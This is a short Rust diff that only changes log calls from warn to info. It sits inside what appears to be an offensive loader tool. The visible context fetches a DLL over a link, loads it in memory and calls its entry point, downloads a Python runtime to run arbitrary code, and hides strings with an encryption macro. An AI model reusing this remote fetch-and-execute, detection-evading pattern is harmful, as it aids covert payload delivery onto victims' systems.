@@ -23,7 +23,7 @@ use crate::embedder;
 
 use log::debug;
 use log::error;
-use log::warn;
+use log::info;
 
 use std::io::stdout;
 use std::io::Write;
@@ -84,22 +84,22 @@ impl DllFromMemory {
         let data: Vec<u8> = self.link.fetch_data()?;
         let mydll: &[u8] = &data;
 
-        warn!("{}", encrypt_string!("Map DLL in memory"));
+        info!("{}", encrypt_string!("Map DLL in memory"));
         let mm = memorymodule_rs::MemoryModule::new(mydll);
 
-        warn!(
+        info!(
             "{}{}",
             encrypt_string!("Retreive DLL entrypoint: "),
             &self.dll_entrypoint
         );
         let dll_entry_point =
             unsafe { mem::transmute::<_, DllEntryPoint>(mm.get_function(&self.dll_entrypoint)) };
-        warn!("{}", encrypt_string!("dll_entry_point()"));
+            info!("{}", encrypt_string!("dll_entry_point()"));
 
         let result = dll_entry_point();
         debug!("{}{}", encrypt_string!("DLL result = "), result);
         //TODO quand on part d'ici, il y a un probleme
-        warn!("{}", encrypt_string!("-> TODO repair unsafe"));
+        info!("{}", encrypt_string!("-> TODO repair unsafe"));
         Ok(())
     }
 }
@@ -210,7 +210,7 @@ impl ExecPython {
     #[cfg(target_os = "windows")]
     pub fn deploy_embedder(&self) -> Result<(), anyhow::Error> {
         let _ = self.download_and_unzip_python();
-        warn!(
+        info!(
             "{}{}\n",
             encrypt_string!("execute python with Embedder: "),
             &self.python_code
@@ -220,7 +220,7 @@ impl ExecPython {
     }
 
     pub fn download_and_unzip_python(&self) -> Result<(), anyhow::Error> {
-        warn!("{}", encrypt_string!("download_and_unzip_python"));
+        info!("{}", encrypt_string!("download_and_unzip_python"));
         let archive: Vec<u8> = self.link.fetch_data()?;
         let target_dir = PathBuf::from(&self.out_filepath); // Doesn't need to exist
 
@@ -261,7 +261,7 @@ pub fn banner() {
                           "╨▒╜╢╢Ñ                  ░▒╜
                                                  ``a "#;
 
-    warn!("{}", encrypt_string!("BANNER"));
+    info!("{}", encrypt_string!("BANNER"));
     let sleep_time = time::Duration::from_millis(3);
     for c in banner.chars() {
         print!("{}", c);
